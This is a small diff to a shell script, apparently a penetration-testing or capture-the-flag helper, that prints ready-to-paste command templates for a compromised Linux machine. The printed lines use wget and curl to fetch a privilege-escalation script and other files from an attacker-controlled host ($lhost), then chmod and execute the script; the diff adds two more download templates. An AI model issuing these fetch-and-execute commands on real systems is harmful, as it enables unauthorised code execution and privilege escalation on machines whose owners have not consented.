@@ -7,10 +7,12 @@ echo "########################"
 echo "Download Privesc Script"
 echo "########################"
 echo "wget http://"$lhost":80/linux/script/script_linux.sh"
+echo "wget http://"$lhost":80/IPAddr/File"
 echo "chmod 700 script_linux.sh"
 echo "./script_linux.sh"
 
 echo "curl -OL http://"$lhost":80/linux/script/script_linux.sh"
+echo "curl -OL http://"$lhost":80/IPAddr/File"
 echo "chmod 700 script_linux.sh"
 echo "./script_linux.sh"
 
